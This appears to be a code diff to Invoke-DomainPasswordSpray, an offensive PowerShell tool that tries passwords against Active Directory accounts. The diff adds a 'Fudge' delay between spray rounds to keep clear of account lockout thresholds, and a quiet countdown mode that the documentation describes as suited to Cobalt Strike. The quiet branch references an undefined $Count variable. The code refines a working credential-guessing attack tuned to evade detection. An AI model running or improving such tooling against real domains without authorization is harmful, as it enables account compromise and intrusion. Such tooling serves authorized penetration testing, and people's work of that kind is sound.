@@ -42,6 +42,10 @@ function Invoke-DomainPasswordSpray{
 
     Forces the spray to continue and doesn't prompt for confirmation.
 
+    .PARAMETER Fudge
+
+    Extra wait time between each round of tests (seconds).
+
     .PARAMETER Quiet
 
     Less output so it will work better with things like Cobalt Strike
@@ -117,8 +121,11 @@ function Invoke-DomainPasswordSpray{
 
      [Parameter(Position = 10, Mandatory = $false)]
      [switch]
-     $Quiet
+     $Quiet,
 
+     [Parameter(Position = 11, Mandatory = $false)]
+     [int]
+     $Fudge=10
     )
 
     if ($Password)
@@ -230,7 +237,7 @@ function Invoke-DomainPasswordSpray{
             Invoke-SpraySinglePassword -Domain $CurrentDomain -UserListArray $UserListArray -Password $Passwords[$i] -OutFile $OutFile -Delay $Delay -Jitter $Jitter -Quiet $Quiet
             if (($i+1) -lt $Passwords.count)
             {
-                Countdown-Timer -Seconds (60*$observation_window)
+                Countdown-Timer -Seconds (60*$observation_window + $Fudge) -Quiet $Quiet
             }
         }
     }
@@ -246,14 +253,21 @@ function Countdown-Timer
 {
     param(
         $Seconds = 1800,
-        $Message = "[*] Pausing to avoid account lockout."
+        $Message = "[*] Pausing to avoid account lockout.",
+        [switch] $Quiet = $False
     )
-    foreach ($Count in (1..$Seconds))
+    if ($quiet)
     {
-        Write-Progress -Id 1 -Activity $Message -Status "Waiting for $($Seconds/60) minutes. $($Seconds - $Count) seconds remaining" -PercentComplete (($Count / $Seconds) * 100)
-        Start-Sleep -Seconds 1
+        Write-Host "$Message: Waiting for $($Seconds/60) minutes. $($Seconds - $Count)"
+        Start-Sleep -Seconds $Seconds
+    } else {
+        foreach ($Count in (1..$Seconds))
+        {
+            Write-Progress -Id 1 -Activity $Message -Status "Waiting for $($Seconds/60) minutes. $($Seconds - $Count) seconds remaining" -PercentComplete (($Count / $Seconds) * 100)
+            Start-Sleep -Seconds 1
+        }
+        Write-Progress -Id 1 -Activity $Message -Status "Completed" -PercentComplete 100 -Completed
     }
-    Write-Progress -Id 1 -Activity $Message -Status "Completed" -PercentComplete 100 -Completed
 }
 
 function Get-DomainUserList
